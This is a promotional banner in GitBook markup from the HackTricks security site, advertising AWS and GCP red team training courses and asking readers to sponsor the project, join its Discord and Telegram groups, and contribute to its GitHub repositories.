{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
